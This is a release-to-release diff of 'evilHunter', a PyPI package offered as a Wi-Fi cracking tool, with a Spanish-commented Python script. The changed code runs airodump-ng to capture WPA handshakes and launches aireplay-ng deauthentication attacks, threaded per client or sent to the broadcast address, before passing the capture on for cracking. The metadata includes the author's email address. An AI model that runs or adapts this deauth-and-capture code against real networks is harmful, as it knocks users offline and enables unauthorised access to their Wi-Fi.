# Comparing `tmp/evilHunter-0.1.9.46.tar.gz` & `tmp/evilHunter-0.1.9.47.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.9.46.tar", last modified: Fri Jun 23 11:51:55 2023, max compression
+gzip compressed data, was "evilHunter-0.1.9.47.tar", last modified: Sun Jun 25 11:18:44 2023, max compression
```

## Comparing `evilHunter-0.1.9.46.tar` & `evilHunter-0.1.9.47.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/
--rw-r--r--   0 root         (0) root         (0)     2653 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     2420 2023-06-22 19:13:13.000000 evilHunter-0.1.9.46/README.md
--rw-r--r--   0 root         (0) root         (0)     4212 2023-06-22 19:31:15.000000 evilHunter-0.1.9.46/evilCracker.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/evilHunter.egg-info/
--rw-r--r--   0 root         (0) root         (0)     2653 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      216 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       14 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)        6 2023-06-23 11:51:55.000000 evilHunter-0.1.9.46/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)    31252 2023-06-23 11:42:45.000000 evilHunter-0.1.9.46/evilHunter.py
--rw-r--r--   0 root         (0) root         (0)       38 2023-06-23 11:51:55.438934 evilHunter-0.1.9.46/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      558 2023-06-23 11:44:40.000000 evilHunter-0.1.9.46/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/
+-rw-r--r--   0 root         (0) root         (0)     2653 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)     2420 2023-06-22 19:13:13.000000 evilHunter-0.1.9.47/README.md
+-rw-r--r--   0 root         (0) root         (0)     4212 2023-06-23 14:59:42.000000 evilHunter-0.1.9.47/evilCracker.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/evilHunter.egg-info/
+-rw-r--r--   0 root         (0) root         (0)     2653 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      216 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       14 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 root         (0) root         (0)        6 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)    31766 2023-06-25 11:16:30.000000 evilHunter-0.1.9.47/evilHunter.py
+-rw-r--r--   0 root         (0) root         (0)       38 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      558 2023-06-25 11:18:32.000000 evilHunter-0.1.9.47/setup.py
```

### Comparing `evilHunter-0.1.9.46/PKG-INFO` & `evilHunter-0.1.9.47/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.46
+Version: 0.1.9.47
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
```

### Comparing `evilHunter-0.1.9.46/README.md` & `evilHunter-0.1.9.47/README.md`

 * *Files identical despite different names*

### Comparing `evilHunter-0.1.9.46/evilCracker.py` & `evilHunter-0.1.9.47/evilCracker.py`

 * *Files identical despite different names*

### Comparing `evilHunter-0.1.9.46/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.9.47/evilHunter.egg-info/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.46
+Version: 0.1.9.47
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
```

### Comparing `evilHunter-0.1.9.46/evilHunter.py` & `evilHunter-0.1.9.47/evilHunter.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,9 +1,10 @@
 #!/bin/python3
 # SUBIR A PYPI
+# Frenar deauth
 
 try:
     # Importamos librerias
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
     import string
     import re
@@ -11,14 +12,15 @@
     from colorama import Fore
     import os
     import time
     import random
     import subprocess
     import threading
     import multiprocessing
+    from concurrent.futures import ThreadPoolExecutor
     import os
     import argparse
     import evilCracker
     time.sleep(1)
     print(Fore.GREEN + "\n[*] " + Fore.YELLOW + "Librerias importadas correctamente...\n" + Fore.RESET)
 
 except ModuleNotFoundError as e:
@@ -542,15 +544,15 @@
             print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
 
     prepare_attack(net_specs, net_clients, network_to_attack, args)
 
 
 def prepare_attack(net_specs, net_clients, network_to_attack, args):
     file = None
-
+    clients = {}
     while not file:
         file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
                      Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")
 
         if os.system("find /home/EvilHunter_Data/captures/{}/{}* 2>/dev/null 1>/dev/null"
                      .format(network_to_attack, file)) == 0:
             print(Fore.RED + "\n\t\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
@@ -563,20 +565,18 @@
     # Leer handshake
     direc = "/home/EvilHunter_Data/captures/" + network_to_attack
 
     for num_net in net_clients['networks']:
         try:
             clients = net_clients['networks'][num_net][bssid]
         except KeyError:
-            clients = None
             continue
 
     if clients:
         attack_client = print_clients(net_clients, bssid)
-
     else:
         attack_client = None
 
     time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
           Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
           Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
@@ -634,14 +634,16 @@
             if clients_to_do_attack != 0:
                 break
 
         else:
             clients_to_do_attack = verify_clients(num_client, clients, clients_to_attack)
             if clients_to_do_attack != 0:
                 break
+            else:
+                clients_to_do_attack = None
 
     # Devolvemos cliente a atacar
     return clients_to_do_attack
 
 
 def verify_clients(client, clients, clients_to_attack):
     try:
@@ -668,45 +670,56 @@
     if not os.path.exists(f"/home/EvilHunter_Data/captures/{network_to_attack}/"):
         os.makedirs(f"/home/EvilHunter_Data/captures/{network_to_attack}/")
 
     hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/"
                              + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
 
+    threads = []
     # Si tenemos cliente  para atacar:
-    if attack_client is not None:
-        threads = []
-        for client in attack_client:
-            thread = threading.Thread(target=deauth_client, args=(bssid, client))
+    if attack_client is not None:   # 1 solo client
+        if len(attack_client) == 1:
+            time.sleep(0.2)
+            thread = threading.Thread(target=deauth_client, args=(bssid, attack_client[0]))
             thread.start()
             threads.append(thread)
 
-        # Esperar a que todos los hilos terminen
-        for thread in threads:
-            thread.join()
-            
+        elif len(attack_client) > 1:   # Mas de 1 clients
+            for client in attack_client:
+                time.sleep(0.2)
+                thread = threading.Thread(target=deauth_client, args=(bssid, client))
+
+                thread.start()
+                threads.append(thread)
+
     # Si no al broadcast
-    else:
+    elif attack_client is None:
         subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
                          stdout=subprocess.DEVNULL)
 
     done = False
     while True:
         try:
             output = hand.stdout.readline()
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
+                time.sleep(0.2)
                 # Dejamos que se envien correctamente todos los paquetes
                 done = True
                 # Rompemos búcle
                 break
 
         except KeyboardInterrupt:
             break
 
+    # Esperar a que todos los hilos terminen
+    if threads:
+        for thread in threads:
+            thread.join()
+
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
         print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
     crack_handshake(direc, args, file, network_to_attack)
```

### Comparing `evilHunter-0.1.9.46/setup.py` & `evilHunter-0.1.9.47/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.9.46",
+    version="0.1.9.47",
     description="Cracking WiFi(KCRACK)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
```

